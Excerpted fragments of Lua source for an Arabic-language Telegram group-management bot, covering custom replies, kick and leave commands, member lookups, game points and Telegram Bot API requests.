text = "\n◈︙قائمة ردود المطور \n↫ ┄┄┄┄┄┄┄┄┄┄┄┄ ↬\n"
for k,v in pairs(list) do
...
send(msg.chat_id_, msg.id_,'◈︙تم حفظت الرد')
return false  
end  
end
...
if text == 'اضف رد للكل' and DevlIMW(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == 'حذف رد للكل' and DevlIMW(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
send(msg.chat_id_, msg.id_,"◈︙تم مسحت ردود المدير")
end
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'ليم').." غادر" or text == 'غادر' then  
...
if text == 'تفعيل المغادره' and DevlIMW(msg) then   
...
if text == 'تعطيل المغادره' and DevlIMW(msg) then  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n◈︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'lIM')..') '
...
local username = ('[@'..data.username_..']' or 'مافيه')
...
send(msg.chat_id_, msg.id_,'◈︙المعرف مش صحيح ')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'RRRRDL')..')'
local iduser = result.sender_user_id_
...
send(msg.chat_id_, msg.id_, '\n◈︙هييه ما اقدر اطرد ( '..Rutba(msg.sender_user_id_,msg.chat_id_)..' )')
return false
end
...
send(msg.chat_id_, msg.id_,'◈︙هييه ما اقدر اطرد ادمنية الكروب') 
return false  
end
...
send(msg.chat_id_, msg.id_,'◈︙ابشر عطلت امر اطردني') 
end
end
...
send(msg.chat_id_, msg.id_,'◈︙ما اقدر اصيح معرف قنوات') 
return false  
end
if result.type_.user_.type_.ID == "UserTypeBot" then
send(msg.chat_id_, msg.id_,'◈︙ما اقدر اصيح معرف بوتات') 
return false  
end
...
if result.id_ then
send(msg.chat_id_, msg.id_,'◈︙تعال حبي ينادولك بل كروب [@'..username..']') 
return false
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
else
send(msg.chat_id_, msg.id_,'◈︙ابشر عطلت امر صيح') 
end
return false
end
...
send(msg.chat_id_, msg.id_,'◈︙ابشر عطلت امر منو ضافني') 
end
end
...
send(msg.chat_id_, msg.id_,'◈︙ ابشر غيرت الايدي ارسل ايدي لرؤيته')
end
...
send(msg.chat_id_, msg.id_,'◈︙تم مسحت سحكاتك'  )  
database:del(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_)
end
if text == "مسح جهاتي" or text == "حذف جهاتي" then  
send(msg.chat_id_, msg.id_,'◈︙تم مسحت جهاتك'  )  
...
-- vardump(data) 
lIMdx(msg.chat_id_, msg.id_, '◈︙ايدي المجموعة » ( '..msg.chat_id_..' )\n◈︙عدد الادمنيه » ( *'..data.administrator_count_..' )*\n◈︙عدد المحظورين » ( *'..data.kicked_count_..' )*\n◈︙عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
if Num == 0 then 
Text = '◈︙ما لعبت اي لعبه للحصول على نقاط'
else
...
send(msg.chat_id_,msg.id_,"\n*◈︙ما اقدر البيع اقل من 1 *") 
return false 
end
if tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_)) == tonumber(0) then
send(msg.chat_id_,msg.id_,'◈︙ما عندك نقاط في الالعاب\n◈︙اذا كنت تريد ربح نقاط \n◈︙ارسل الالعاب وابدأ اللعب ! ') 
else
local NUM_GAMES = database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_)
if tonumber(NUMPY) > tonumber(NUM_GAMES) then
send(msg.chat_id_,msg.id_,'\n◈︙ما عندك نقاط في هذه لعبه \n◈︙لزيادة نقاطك في اللعبه \n◈︙ارسل الالعاب وابدأ اللعب !') 
return false 
end
...
send(msg.chat_id_, msg.id_,"◈︙ابشر غيرت رد المطور الى » "..Teext)
end
...
𖡺 [𝙻𝙸𝙼 𝙲𝙷𝙰𝙽𝙽𝙴𝙻](t.me/RRRRDL)➢ 
  ...
  {
  {text = '𝚂𝙾𝚄𝚁𝙲𝙴 𝙻𝙸𝙼 ', url="t.me/RRRRDL"},
  },
  }
  local msg_id = msg.id_/2097152/0.5
...
SendText(msg.chat_id_,msg.id_,"- المعرف مش صحيح \n*")   
return false  end   
...
𖡺 [𝙻𝙸𝙼 𝙲𝙷𝙰𝙽𝙽𝙴𝙻](t.me/RRRRDL)➢
  ...
  {
    {text = '𝚂𝙾𝚄??𝙲𝙴 𝙻𝙸𝙼 ', url="t.me/RRRRDL"},
  },
  }
  return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
  end
...
send(msg.chat_id_, msg.id_,'◈︙تم حذفت الامر')  
else
send(msg.chat_id_, msg.id_,'◈︙مافيه امر بهذا الاسم')  
end
...
send(msg.chat_id_, msg.id_, '◈︙ابشر عطلت اوامر التحشيش')
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'ليم')
...
lIM = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(lIM)
...
------------------------------------------------------------------------
local lIMAbot = database:get(bot_id.."lIM1:Add:Filter:Rp2"..text..result.chat_id_)   
if lIMAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"◈︙العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n◈︙["..lIMAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local lIM1_Msg = database:get(bot_id.."lIM1:Add:Filter:Rp2"..text..result.chat_id_)   
if lIM1_Msg then    
send(msg.chat_id_, msg.id_,"◈︙"..lIM1_Msg)
